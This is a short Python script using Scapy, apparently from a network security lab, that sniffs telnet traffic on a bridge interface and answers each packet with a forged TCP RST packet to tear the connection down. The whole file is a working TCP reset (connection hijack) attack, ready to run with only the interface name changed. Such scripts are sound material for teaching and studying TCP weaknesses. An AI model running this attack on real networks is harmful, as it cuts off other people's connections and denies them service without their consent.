#!/usr/bin/python3
# reset_auto - sniff tcp connection and spoof rst packet to disrupt the tcp connection

from scapy.all import *
from scapy.layers.inet import IP, TCP

def spoof_tcp(pkt):
   IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, #use the acknowledging sequence number 
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   ls(spoofpkt)
   send(spoofpkt, verbose=0)

pkt=sniff(iface='br-5f9aa6b242e3', filter='tcp and port 23', prn=spoof_tcp)


